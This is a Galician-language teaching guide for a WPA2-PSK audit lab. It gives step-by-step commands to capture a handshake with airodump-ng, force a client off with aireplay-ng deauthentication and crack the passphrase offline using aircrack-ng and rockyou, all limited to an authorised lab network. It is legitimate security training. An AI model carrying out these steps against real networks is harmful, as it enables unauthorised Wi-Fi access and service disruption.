Guía da práctica 1.1 — Auditoría WPA2-PSK

Manual docente de referencia

Esta guía segue a práctica 1-Taller-HE-Practica-WiFi-1.pdf{:target="_blank"}. Os comandos execútanse na sesión gráfica do usuario kali da máquina virtual vuln-wifi.lab.

Obxectivo

Identificar a rede WPA2-PSK de laboratorio EMPRESA-XYZ, capturar o intercambio de autenticación 4-way handshake e comprobar, mediante un ataque de dicionario exclusivamente contra esta rede docente, como inflúe a fortaleza da frase de paso. A práctica reproduce o percorrido do PDF de referencia.

Organización das terminais

Traballaremos con dúas terminais abertas no escritorio Kali:

  • Terminal 1 — Observación e análise: inicia o escenario, identifica o AP, realiza a captura e proba o dicionario.
  • Terminal 2 — Desautenticación controlada: utilízase no apartado 4 para provocar a reconexión do cliente, mentres a Terminal 1 continúa capturando.

As interfaces wlan0 (AP) e wlan1 (cliente) funcionan en network namespaces. Para a captura usaremos wlan3, visible desde Kali; para a proba de desautenticación, wlan2. O BSSID e a MAC do cliente deben obterse en cada execución, nunca copiarse dos exemplos.

1. Preparación do escenario (Terminal 1)

Arranca o laboratorio. O controlador desprega o AP lexítimo EMPRESA-XYZ e o cliente de probas:

sudo wifilabctl up psk
sudo wifilabctl status

Comproba as interfaces do AP e do cliente:

sudo ip netns exec wifi_ap_wlan0 iw dev wlan0 info
sudo ip netns exec wifi_cliente_wlan1 iw dev wlan1 info
sudo ip netns exec wifi_cliente_wlan1 iw dev wlan1 link

Se a última orde indica Not connected, agarda uns segundos e repítea. Anota o BSSID do AP, a MAC do cliente e a canle (6).

2. Recoñecemento e modo monitor (Terminal 1)

Para non interferir co cliente nin co AP, utilizamos a interface de observación wlan3:

sudo ip link set wlan3 down
sudo iw dev wlan3 set type monitor
sudo ip link set wlan3 up
sudo iw dev wlan3 set channel 6
sudo iw dev wlan3 info

O resultado debe indicar type monitor e a canle 6. Identifica tamén o AP coa ferramenta de auditoría empregada no PDF:

sudo airodump-ng --channel 6 wlan3

Busca o ESSID EMPRESA-XYZ e contrasta o seu BSSID co obtido antes. Para saír de airodump-ng, preme Ctrl+C.

3. Captura do handshake (Terminal 1)

Inicia a captura sobre a rede de laboratorio. Substitúe BSSID_AP polo valor real anotado (por exemplo, 02:11:22:33:44:55; ese valor é só ilustrativo):

sudo airodump-ng -c 6 --bssid BSSID_AP -w captura_psk wlan3

Deixa esta terminal aberta. O programa xerará ficheiros como captura_psk-01.cap. A captura continuará mentres utilizamos a segunda terminal.

4. Desautenticación controlada (Terminal 2)

Abre unha segunda terminal; non peches a Terminal 1. O obxectivo é forzar unha reconexión do cliente de laboratorio, que pode producir un novo handshake.

Configura a radio de ataque wlan2:

sudo ip link set wlan2 down
sudo iw dev wlan2 set type monitor
sudo ip link set wlan2 up
sudo iw dev wlan2 set channel 6

Usa exclusivamente o BSSID e a MAC do cliente identificados no apartado 1:

sudo aireplay-ng --deauth 1 -a BSSID_AP -c MAC_CLIENTE wlan2

Volve á Terminal 1. Se airodump-ng captura o intercambio, aparecerá unha indicación como WPA handshake: .... Despois preme Ctrl+C para gardar a captura.

Como interpretar o resultado

O número de ACKs de aireplay-ng non demostra por si só que a desautenticación tivera éxito. Comproba a desconexión/reconexión do cliente e o PCAP. A práctica 1.2 — Desautenticación sen PMF amplía a análise das tramas e os efectos observados.

Para comprobar o estado de asociación:

sudo ip netns exec wifi_cliente_wlan1 iw dev wlan1 link

Para visualizar as mensaxes EAPOL capturadas:

sudo tshark -r captura_psk-01.cap -Y eapol -T fields \
  -e frame.number -e wlan.sa -e wlan.da \
  -e wlan_rsna_eapol.keydes.msgnr

O resultado esperado é observar mensaxes do 4-way handshake; poden existir retransmisións. Se non aparece ningunha, repetiremos a captura antes de continuar.

5. Proba de dicionario con Rockyou (Terminal 1)

O PDF orixinal continúa coa comprobación da robustez do contrasinal mediante aircrack-ng. Esta proba só debe realizarse contra a captura xerada polo escenario autorizado psk.

Paso 1. Preparar o dicionario. Se rockyou.txt está comprimido:

sudo gzip -dk /usr/share/wordlists/rockyou.txt.gz

Se xa existe /usr/share/wordlists/rockyou.txt, non é necesario descomprimilo novamente.

Paso 2. Executar a proba offline:

sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt captura_psk-01.cap

No exemplo do manual pode aparecer KEY FOUND! [ spongebob19 ]. Este é un resultado de referencia, non unha saída garantida: depende de que o PCAP conteña un intercambio útil e de que a frase de paso estea no dicionario. A proba offline non envía novas peticións ao AP.

6. Evidencias e limpeza

Antes de limpar, anota:

  1. ESSID, BSSID e canle da rede de laboratorio.
  2. Estado de conexión do cliente antes e despois da proba.
  3. Confirmación da captura do handshake, preferentemente con mensaxes EAPOL.
  4. Resultado real de aircrack-ng (con independencia de que atope ou non unha clave).

Ao rematar a práctica:

sudo wifilabctl reset
